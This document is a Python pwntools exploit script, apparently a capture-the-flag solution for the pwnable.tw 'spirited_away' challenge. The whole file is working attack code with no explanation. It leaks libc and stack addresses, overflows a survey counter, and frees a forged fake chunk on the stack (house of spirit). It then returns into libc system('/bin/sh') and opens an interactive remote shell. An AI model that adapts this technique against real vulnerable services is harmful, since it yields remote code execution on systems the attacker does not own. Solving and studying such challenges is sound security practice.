from pwn import *
context.arch = 'i386'
elf  = 	ELF('spirited_away')
libc = 	ELF('libc_32.so.6')
io   = 	remote("chall.pwnable.tw",10204)
klen =	0x3c

'''
libc =	ELF('/lib/i386-linux-gnu/libc-2.23.so')
io   = 	process('./spirited_away')
'''

def survey(name,age,reason,comment):
    assert len(name)<=klen and len(reason)<=0x50 and len(comment)<=klen
    io.sendafter('name: ',name)
    io.sendlineafter('age: ',str(age))
    io.sendafter('movie? ',reason)
    io.sendafter('comment: ',comment)

survey('aaaa',1,'b'*0x20,'cccc')
io.recvuntil('b'*0x20)
libc_base = u32(io.recv(4))-libc.sym['_IO_2_1_stdout_']
info('LIBC BASE -> %#x'%libc_base)
io.sendafter('<y/n>: ','y')

survey('aaaa',1,'b'*0x38,'cccc')
io.recvuntil('b'*0x38)
ebp = u32(io.recv(4))-(0xffdd12a8-0xffdd1288)
info('EBP -> %#x'%ebp)
io.sendafter('<y/n>: ','y')

def lazy_survey(name,age,reason,comment):
    assert len(name)<=klen and len(reason)<=0x50 and len(comment)<=klen
    io.recvuntil('name: ')
    io.send(name)
    io.recvuntil('age: ')
    io.sendline(str(age))
    io.sendafter('movie? ',reason)
    io.sendafter('comment: ',comment)

for i in range(2,101):
    lazy_survey('a'*0x3c,1,'b'*0x50,'c'*0x3c)
    io.recvuntil('<y/n>: ')
    io.send('y')
    info('cnt : %d'%i)

def busy_survey(name,reason,comment):
    io.sendafter('name: ',name)
    io.sendafter('movie? ',reason)
    io.sendafter('comment: ',comment)
fchunk  = (p32(0x0)+p32(0x41))+'x'*0x38+(p32(0x0)+p32(0x41))
payload = 'z'*0x50+'wwww'+p32(ebp-0x48)+(p32(0x0)+p32(0x41))
busy_survey('aaaa',fchunk,payload)
io.sendafter('<y/n>: ','y')

rop = 0x48*'x'
rop += 0x4*'y'
rop += p32(libc.sym['system']+libc_base)
rop += 0x4*'z'
rop += p32(libc.search("/bin/sh\x00").next()+libc_base)
busy_survey(rop,'aha','aha')
io.sendafter('<y/n>: ','y')

io.interactive()
